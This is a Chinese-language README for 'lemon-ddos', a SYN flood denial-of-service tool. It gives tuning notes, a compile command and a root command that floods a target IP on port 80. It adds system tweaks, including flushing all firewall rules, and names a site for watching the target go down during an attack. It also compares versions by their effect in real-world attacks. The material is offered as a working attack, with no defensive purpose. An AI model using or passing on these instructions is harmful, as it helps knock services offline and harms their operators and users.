# lemon-ddos
# 性能优化亮点：
```
1.每个线程独立资源：
 独立套接字
 独立随机数种子
 独立数据包缓冲区
 独立统计计数器
2.网络优化：
 100MB 发送缓冲区 (#define SOCKET_BUFFER_SIZE (100 * 1024 * 1024))
 非阻塞 I/O 模式
 TCP_NODELAY 选项禁用 Nagle 算法
3.CPU 优化：
 线程绑定到特定 CPU 核心
 高性能随机数生成器 (比标准 rand() 快 10 倍)
 预计算数据包长度减少循环开销
4.内存优化：
 栈上固定缓冲区用于校验和计算
 预生成随机负载避免重复计算
```
# 编译指令：
```
gcc -O3 -march=native -mtune=native -pthread -o syn_flood syn_flood.c
```
# 运行建议：
## 以 root 权限运行：
```
sudo ./syn_flood 192.168.1.100 80 16 60 100 eth0
```
## 系统优化命令：
```
# 增加网络缓冲区
sudo sysctl -w net.core.wmem_max=12582912
sudo sysctl -w net.core.rmem_max=12582912

# 增加最大打开文件数
ulimit -n 1000000

# 禁用防火墙
sudo iptables -F
```

## 监控性能：
```
# 查看CPU使用情况（按核心）
mpstat -P ALL 1

# 查看网络吞吐量
iftop -i eth0

# 查看中断分布
watch -n1 'cat /proc/interrupts | grep eth0'
```

# 优化脚本
优化脚本optimize_network.sh很重要
优化前
![image](https://github.com/user-attachments/assets/806f562d-a1d8-44b1-999f-72202e68b98c)
优化后
![image](https://github.com/user-attachments/assets/6474cc20-a50c-4378-a286-14ce46b754e2)


# 观测
攻击的时候可以在这里观测一下目标状态
https://tcp.ping.pe/
![image](https://github.com/user-attachments/assets/64ab015e-8505-4005-8d5a-531fb909ba2e)


# 对比
旧的
![image](https://github.com/user-attachments/assets/0fac75f3-e3af-46ff-b139-2aa62f27a3cd)
新的
![image](https://github.com/user-attachments/assets/cac62dd5-9f64-4f20-9c1e-f1bfaf873a1e)
从这次测试来看，新的效果不错，但是实战中，旧的好像打出过更好的效果，不过在此次截图的测试中，在目标节点上看两个的峰值差不多，建议使用新的

